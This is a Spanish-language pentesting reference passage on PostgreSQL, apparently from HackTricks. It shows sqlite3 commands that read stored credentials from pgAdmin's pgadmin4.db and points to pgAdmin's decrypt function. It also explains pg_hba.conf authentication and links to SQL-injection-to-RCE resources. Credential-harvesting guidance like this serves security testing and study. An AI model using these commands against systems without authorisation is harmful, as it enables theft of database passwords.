[pgadmin](https://www.pgadmin.org) es una plataforma de administración y desarrollo para PostgreSQL.\
Puedes encontrar **passwords** dentro del archivo _**pgadmin4.db**_\
Puedes descifrarlos usando la función _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

La autenticación de clientes en PostgreSQL se gestiona mediante un archivo de configuración llamado **pg_hba.conf**. Este archivo contiene una serie de registros, cada uno especificando un tipo de conexión, rango de direcciones IP del cliente (si corresponde), nombre de la base de datos, nombre de usuario y el método de autenticación a usar para emparejar conexiones. El primer registro que coincida con el tipo de conexión, la dirección del cliente, la base de datos solicitada y el nombre de usuario se utiliza para la autenticación. No existe un mecanismo alternativo o de respaldo si falla la autenticación. Si ningún registro coincide, se deniega el acceso.

Los métodos de autenticación basados en contraseña disponibles en pg_hba.conf son **md5**, **crypt** y **password**. Estos métodos difieren en cómo se transmite la contraseña: con hash MD5, cifrada por crypt o en texto claro. Es importante señalar que el método crypt no se puede usar con contraseñas que hayan sido encriptadas en pg_authid.

## Referencias

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
